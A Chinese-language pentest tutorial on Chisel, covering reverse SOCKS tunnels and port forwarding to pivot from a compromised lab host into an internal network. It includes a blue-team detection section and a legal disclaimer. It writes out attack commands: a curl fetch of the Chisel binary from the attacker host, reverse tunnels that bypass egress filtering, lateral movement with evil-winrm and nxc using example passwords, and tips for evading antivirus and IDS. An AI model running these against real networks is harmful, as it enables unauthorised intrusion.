# Chisel（HTTP 隧道 / 内网穿透）

> **一句话**：单个二进制文件，用它把「只有被控主机能访问的内网端口」通过 HTTP(S) 隧道搬到你的 Kali 上——不需要目标机器有公网 IP，也不需要安装任何编译环境。
> **分类**：后渗透 / 协议隧道（Command & Control）｜ **Kali 包**：`chisel`（命令 `chisel`）｜ **官方文档**：<https://github.com/jpillora/chisel>

---

## 1. 它解决什么问题

打进第一台机器后，通常会遇到这种情况：

```
[你的 Kali]  ──可达──►  [跳板机 DMZ]  ──可达──►  [内网主机 10.10.20.5:3389]
                              ▲
                      你无法直接从 Kali 访问 10.10.20.0/24
```

解决方案有三类，Chisel 属于**最省事**的一类：

| 方案 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| **Chisel** | 跳板机上跑 client，与 Kali 的 server 建 HTTP(S) 隧道 | 单文件、跨平台、走 80/443 易过防火墙、支持反向 | 只有 SOCKS/端口转发，非 TUN 设备 |
| **Ligolo-ng** | 跳板机跑 agent，Kali 起 TUN 接口 | 无 SOCKS、原生路由、速度最快 | 需要 Kali 有 TUN 权限 |
| **SSH 动态转发** | `ssh -D` | 随手可用 | 需要目标有 SSH 且你能登录 |
| **Metasploit `autoroute`+`socks_proxy`** | msf 自己代理 | 与 msf 一体 | 只对 msf 自身流量生效 |

关键概念 **反向隧道（reverse）**：内网主机通常**能出网、不能入网**（NAT/防火墙）。所以正确姿势是：

- Kali（公网/可达侧）跑 **`chisel server --reverse`** 监听；
- 被控主机跑 **`chisel client <kali>:8080 R:socks`**；
- client **主动连出去**，把内网端口**反向**映射给 Kali。这样完全绕开了入站限制。

---

## 2. 工作原理

Chisel 用 **HTTP(S) 之上的 WebSocket** 承载隧道数据，底层仍是 TCP：

```
┌─────────────── Kali（可达侧） ───────────────┐
│ chisel server --reverse -p 8080              │
│   ├─ HTTP 端点：接收 client 连接（可套 TLS）    │
│   └─ 本地监听：SOCKS5 / 转发端口               │
└───────────────▲──────────────────────────────┘
                │  出站 TCP/HTTP（能过 80/443 白名单）
┌───────────────┴──────────────┐
│ 被控主机（内网侧）              │
│ chisel client <kali>:8080 \   │
│        R:socks                │  ← R: 前缀 = 反向：在 server 侧开监听
│        R:3389:10.10.20.5:3389 │
└──────────────────────────────┘
```

**语法核心（记住这一条）**：

```
[local_port:]host:port            # 正向：在 client 侧监听，转发到 server 侧可达的 host:port
R:[remote_port:]host:port         # 反向：在 server 侧监听，转发到 client 侧可达的 host:port
R:socks                           # 反向 SOCKS5（默认端口 1080）；等价 R:1080:socks
socks                             # 正向 SOCKS5
```

隧道是通过 **WebSocket** 的（`/ws` 路径），所以从防火墙看是普通 HTTP(S) 流量。`--auth user:pass` 做基本认证，`--tls-cert/--tls-key` 或前端反代可加 TLS。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install chisel
chisel -h
```

```console
root@kali:~# chisel -h

  Usage: chisel [command] [--help]

  Version: 1.12.0~rc2-0kali1 (go1.26.5)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

**最常用的一条链路（反向 SOCKS）**：

```bash
# ① Kali（服务端）
chisel server --reverse -p 8080 --auth kali:StrongPass

# ② 被控主机（客户端）——Windows 需先上传 chisel.exe
chisel client http://192.168.56.5:8080 R:socks kali:StrongPass
```

```console
2024/09/15 12:00:00 client: Connecting to ws://192.168.56.5:8080
2024/09/15 12:00:01 client: Connected (Latency 3.2ms)
2024/09/15 12:00:01 client: socks5 listening on 127.0.0.1:1080   ← 注意：这是 **Kali 侧** 的 1080
```

```bash
# ③ 在 Kali 上用 proxychains4 通过这个 SOCKS 打内网
proxychains4 -q nmap -sT -Pn -p 445,3389 10.10.20.5
```

> 跨平台二进制：Chisel 是单个可执行文件。Windows 靶机需要 `chisel.exe`（可从 release 下载，或 `apt download chisel` 后取 Linux 版对应不了 Windows）。**授权测试中请只对自有靶机投放**。

---

## 4. 核心参数详解

### 4.1 服务端 `chisel server`

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `--host <ip>` | 监听地址 | 默认 `0.0.0.0`；只允许本机时 `127.0.0.1` |
| `-p, --port <n>` | 监听端口 | 用 80/443/8080；**授权测试中也要考虑是否合法占用 80** |
| `--reverse` | **允许客户端请求反向隧道** | 反向场景**必须加**，否则 `R:` 语法被拒 |
| `--socks5` | 允许客户端请求 SOCKS | 与 `--reverse` 无关，控制是否允许 `socks` 映射 |
| `--auth <user:pass>` | 基本认证 | **强烈建议开启**，否则任何人可连 |
| `--tls-cert` / `--tls-key` | 自定义 TLS 证书 | 有合法证书时用它，流量更「正常」 |
| `--tls-domain` | 用 ACME 自动签发证书 | 有公网域名时可用 |
| `--backend <url>` | 作为反代后端（配合 Nginx） | 用 Nginx 做 TLS 终结 + 路径隐藏 |
| `--keepalive <dur>` | 心跳间隔 | 长连接保活 |
| `-v, --verbose` | 详细日志 | 排错 |

### 4.2 客户端 `chisel client`

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `<server>` | 服务端地址（可含 scheme） | `http://1.2.3.4:8080`、`https://...` |
| `R:...` / `...` | 映射规则（见第 2 节语法） | `R:socks`、`R:3389:h:3389`、`8080:h:80` |
| `--fingerprint <fp>` | 校验服务端证书指纹 | 自签证书场景更安全 |
| `--skip-verify` | 跳过 TLS 校验 | 自签证书时方便，但降低安全性 |
| `--auth <user:pass>` | 认证（也可直接写在 URL 里） | 与服务端一致 |
| `--proxy <url>` | 通过 HTTP/SOCKS 代理连服务端 | 需要逐层穿透时用 |
| `--header <k:v>` | 自定义 HTTP 头 | 适配有 WAF/反代的环境 |
| `--keepalive <dur>` | 心跳（默认 25s） | NAT 环境下可调小 |
| `--max-retry-count <n>` | 断线重试次数 | 网络不稳时设大（如 10） |
| `--max-retry-interval <dur>` | 重试最大间隔 | 避免报警般的密集重连 |
| `--pid` | 记录 PID 文件 | 便于脚本管理 |
| `--socks5` | 正向 SOCKS 代理上游 | 少见，配合 `--proxy` 用 |

### 4.3 常见映射写法对照

| 需求 | 写法 | 谁在监听 |
|------|------|----------|
| 反向 SOCKS（最常用） | `R:socks` | **Kali** 的 127.0.0.1:1080 |
| 正向 SOCKS | `socks` | 被控主机的 1080 |
| 把内网 RDP 拉到 Kali | `R:13389:10.10.20.5:3389` | Kali 的 13389 |
| 把内网 Web 拉到 Kali | `R:8081:10.10.20.5:80` | Kali 的 8081 |
| 把 Kali 的服务暴露给内网（正向） | `1080:127.0.0.1:1080` | 被控主机的 1080 |

---

## 5. 实战演练

> **环境声明**：以下在**自建靶场**中进行。拓扑：Kali `192.168.56.5`（可达）→ Linux 跳板机 `192.168.56.10`（双网卡，另一网段 `10.10.20.0/24`）→ 内网 Windows `10.10.20.5`。全部主机为你自有或已授权。**禁止对未授权网络建立隧道（隧道本身即为非法访问的手段）。**

### 场景 1：拉一条反向 SOCKS，用 proxychains 打内网

```bash
# ① Kali：起服务端（务必带认证）
chisel server --reverse --port 8080 --auth kali:S3cretPass
```

```console
2024/09/15 12:00:00 server: Listening on http://0.0.0.0:8080
```

```bash
# ② 跳板机（假设已拿到低权 shell，先上传 chisel）
#   Linux 跳板机：
curl -sSL http://192.168.56.5:8080/... -o /tmp/chisel   # 若无该路径则用其它方式投递
chmod +x /tmp/chisel
/tmp/chisel client http://192.168.56.5:8080 R:socks kali:S3cretPass &
```

```console
2024/09/15 12:00:05 client: Connecting to ws://192.168.56.5:8080
2024/09/15 12:00:05 client: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2024/09/15 12:00:05 client: Connected (Latency 2.1ms)
```

**解读**：`proxy#R:127.0.0.1:1080=>socks: Listening` 表示**Kali 侧**已经开好了 1080 端口的 SOCKS5。

```bash
# ③ Kali 上确认端口与代理可用
ss -lntp | grep 1080
```

```console
LISTEN 0  4096  127.0.0.1:1080  0.0.0.0:*  users:(("chisel",pid=12345,fd=7))
```

```bash
# ④ 用 proxychains 打内网（注意：nmap 必须 -sT）
proxychains4 -q nmap -sT -Pn -p 139,445,3389 10.10.20.5
```

```console
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for 10.10.20.5
Host is up.
PORT     STATE    SERVICE
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
3389/tcp open     ms-wbt-server
```

```bash
# ⑤ 用 nxc / impacket 走代理继续横向（它们都是普通 TCP 客户端，可被 proxychains 包裹）
proxychains4 -q nxc smb 10.10.20.5 -u jdoe -p 'Summer2024!' --shares
proxychains4 -q evil-winrm -i 10.10.20.5 -u Administrator -p 'Passw0rd!'
```

**解读**：拿到 SOCKS 之后，**几乎所有基于 TCP 的工具都能直接复用**，不必为每个工具单独搭隧道。这是 Chisel + proxychains 组合的最大价值。

### 场景 2：精确端口转发（比 SOCKS 更快、更稳）

SOCKS 有额外开销，且某些工具对 SOCKS 支持不好（尤其 RDP 客户端）。这时用**定点端口转发**：

```bash
# 跳板机上：把内网 10.10.20.5 的 RDP 映射到 Kali 的 13389
./chisel client http://192.168.56.5:8080 R:13389:10.10.20.5:3389 kali:S3cretPass
```

```console
client: tun: proxy#R:13389=>10.10.20.5:3389: Listening      ← 监听发生在 Kali 侧
client: Connected (Latency 2.4ms)
```

```bash
# Kali 上直连本地端口即可（无需 SOCKS）
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'Passw0rd!' /cert:ignore
```

顺带把内网 Web 也拉出来：

```bash
./chisel client http://192.168.56.5:8080 \
    R:13389:10.10.20.5:3389 \
    R:8081:10.10.20.5:80 \
    kali:S3cretPass
```

```bash
curl -s http://127.0.0.1:8081/ | head -20
```

**解读**：`R:13389:10.10.20.5:3389` 的含义是「在 **server（Kali）** 上监听 13389；收到的连接通过隧道交给 **client（跳板机）**，由它去连 `10.10.20.5:3389`」。**`R:` 是反向，监听端在 Kali**——这一点初学者最容易搞反。

### 场景 3：多层穿透（Chisel 套 Chisel）+ 与其它隧道工具配合

当内网还有更深的网段（`10.10.30.0/24`，只有 `10.10.20.5` 能到）时：

```bash
# ① 第一层：跳板机 → Kali（反向 SOCKS）
./chisel client http://192.168.56.5:8080 R:socks kali:S3cretPass &

# ② 在 Kali 上通过第一层 SOCKS 登录到 10.10.20.5（假设已有凭据）
proxychains4 -q evil-winrm -i 10.10.20.5 -u Administrator -p 'Passw0rd!'

# ③ 在 10.10.20.5 上投放第二层 chisel client，让它「穿过」第一层连到 Kali：
#    方法：让 10.10.20.5 的 client 通过 Kali 的 8080 直接连（若它能路由到 192.168.56.5）
#    若不能，则在 Kali 上再起一个 server 端口，并用第一层隧道把它暴露到内网侧
chisel server --reverse --port 8081 --auth kali:S3cretPass2      # Kali 再开一个
# 10.10.20.5 上：chisel client http://<可达地址>:8081 R:socks:1081 kali:S3cretPass2
```

**更省事的替代方案**：这种情况下用 **Ligolo-ng** 更合适（TUN 路由天然支持多网段，不需要层层 SOCKS）。见 [`ligolo-ng.md`](ligolo-ng.md)。

```bash
# ④ 也可以让 Chisel 反向连到 Ligolo，或 Chisel 与 proxychains4 交替使用
#    只要记住：每一层都需要一次「出站连接」把内网串起来
```

**解读**：多层穿透的复杂度随时间指数上升。实战建议：**能用一层就不要铺两层**；确需多层时，用 [`ligolo-ng.md`](ligolo-ng.md) 的 TUN 方案管理路由更清晰。

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `server: Listening on http://0.0.0.0:8080` | 服务端就绪 | 等 client 接入 |
| `client: Connected (Latency X ms)` | 隧道建立成功 | 验证端口/代理可用 |
| `client: tun: proxy#R:127.0.0.1:1080=>socks: Listening` | **Kali 侧** SOCKS 已开 | `ss -lntp` 确认，再用 proxychains |
| `client: tun: proxy#R:13389=>10.10.20.5:3389: Listening` | 定点转发就绪 | `xfreerdp /v:127.0.0.1:13389` |
| `server: session#N: client connected` | 有客户端接入 | 看 `--verbose` 日志 |
| `client: Failed to connect: 401 Unauthorized` | 认证失败 | `--auth` 两侧一致 |
| `client: Connection error: dial tcp ... connect: connection refused` | 服务端未起/端口被拦 | 检查服务端与出站规则 |
| `client: Retrying in Xs` | 断线重连 | 加 `--max-retry-count`；检查链接质量 |
| `server: Rejecting reverse tunnel request` | 服务端**没加 `--reverse`** | 服务端加 `--reverse` 重启 |
| proxychains 里工具超时 | 目标端口不通 / 工具不支持 SOCKS | 换成定点端口转发 |

---

## 7. 与其他工具配合

```
① 拿到第一台机器（msf / webshell / ssh / WinRM）
        │
② 投递 chisel（一个二进制，可用 http 下载/编码传输/SMB 共享拷贝）
        │
③ Kali 起 server --reverse  ◄──client 出站连接── 被控主机
        │
        ├─► R:socks  ──► proxychains4 ──► nmap -sT / nxc / impacket / evil-winrm / hydra…
        ├─► R:13389:target:3389 ──► xfreerdp 直连
        └─► 多层时改 ligolo-ng（TUN 路由）
```

- 代理驱动层：[`proxychains4.md`](proxychains4.md)
- 更适合多层/多网段：见 [`ligolo-ng.md`](ligolo-ng.md)
- 隧道另一侧的横向工具：[`netexec.md`](netexec.md)、[`impacket.md`](impacket.md)、[`evil-winrm.md`](evil-winrm.md)
- Web 侧隧道后的提权（webshell 场景）：[`weevely.md`](weevely.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `Rejecting reverse tunnel request` | 服务端缺 `--reverse` | 服务端命令加 `--reverse` |
| Kali 上 1080 没监听 | 用了 `socks` 而不是 `R:socks` | **反向场景必须 `R:` 前缀**（监听在服务端一侧） |
| `401 Unauthorized` | `--auth` 两侧不一致或格式错 | 统一 `user:pass`（不要带 `http://` 前缀） |
| 连接秒断/反复重连 | 网络抖动、NAT 超时 | `--keepalive 15s`、`--max-retry-count 10` |
| 隧道通了但工具连不上内网 | 内网目标不可从**跳板机**到达，或端口写错 | 先在跳板机上 `nc -vz 10.10.20.5 3389` 验证 |
| `nmap` 走代理后全是 `filtered` | 用了默认 SYN 扫描（SOCKS 不支持） | **必须 `-sT -Pn`**，见 [`proxychains4.md`](proxychains4.md) |
| 大流量下载极慢 | 单 WebSocket 通道串行 | 用 Ligolo-ng；或做定点端口转发减少开销 |
| 被控主机杀软删掉 chisel | 特征命中 | 授权测试中记录；可改名/加壳（**仍会被行为检测**） |
| Windows 上执行无输出 | 前台运行被 shell 阻塞 | 用 `start /b` 或计划任务后台化 |
| 用 80 端口起 server 失败 | 端口被占用/需 root | `ss -lntp \| grep :80`；改 8080，或用 `sudo` |
| TLS 报证书错误 | 自签证书 | `--skip-verify`（临时）或 `--fingerprint`（更安全） |
| 隧道被 IDS 拦 | 长连接 WebSocket 特征 | 前端加 Nginx 反代 + 伪装路径（见 [`../12-基础设施与C2/apache2.md`](../12-基础设施与C2/apache2.md)） |

---

## 9. 防御视角（蓝队）

| 攻击面 | 检测信号 | 缓解措施 |
|--------|----------|----------|
| 反向隧道建立 | 内网主机**出站**到固定 IP/端口的长连接（尤其 WebSocket `Upgrade` 头）；连接时长异常 | 出站白名单/正向代理（强制走企业代理）、TLS 检查、流量基线告警 |
| Chisel 二进制落地 | 文件名为 `chisel*`、Go 编译的静态 ELF/PE 特征、无签名的单文件可执行 | 应用白名单（WDAC/AppLocker）、文件完整性监控、EDR 特征 |
| WebSocket 隧道特征 | HTTP `Upgrade: websocket` + 异常 `Sec-WebSocket-Key` 序列、长时间无 HTTP 语义 | 代理层禁用/限制 WebSocket、DPI 识别 Shadowsocks-like 隧道 |
| 隧道内的横向 | 单主机在短时间内连接多个内网 IP/端口（SOCKS 放大效应） | 内网东西向分段、SMB/RDP 入站限制、主机防火墙 |
| proxychains 扫描特征 | `nmap -sT` 的大量 connect 尝试（无 SYN 半开特征） | IDS 阈值告警、连接速率限制 |
| 内存/进程特征 | `chisel` 进程、Go runtime 特征、异常子进程链 | EDR 进程行为规则 |
| 认证弱/无认证的隧道服务端 | 若你在测试中暴露了 `--auth` 缺失的服务端 | **测试后立即关闭**；生产环境绝不暴露这类服务 |

**蓝队关键认知**：Chisel 本身**不是漏洞**，而是「合法的网络工具被滥用」。防御重点在于 **出站流量治理**：绝大多数企业只做入站防护，出站几乎全放行——这正是隧道类工具能成功的原因。**出站白名单 + 强制正向代理**是最有效的一刀。

---

## 10. 参考

- Chisel 官方仓库（含全部参数与用法示例）：<https://github.com/jpillora/chisel>
- Kali 工具页：<https://www.kali.org/tools/chisel/>
- MITRE ATT&CK · 协议隧道（T1572）、应用层协议（T1071）、代理（T1090）
- 本地命令：`chisel -h`、`chisel server -h`、`chisel client -h`

## ⚠️ 法律与伦理

在内网建立隧道用于绕过边界控制、访问未授权主机，可能触犯《刑法》第 285 条（非法侵入计算机信息系统、非法控制计算机信息系统）与第 286 条，并可能违反《网络安全法》第 27 条（禁止非法侵入、干扰、破坏）。

Chisel 本身是合法的网络工具（可用于合法的内网穿透与运维），但**用途决定性质**。本教程仅用于：**书面授权的渗透测试与红队演练、CTF、自建靶场、自有环境的内网穿透实验**。测试结束后必须**关闭所有隧道与服务端监听**，并删除投递到目标主机的二进制文件。
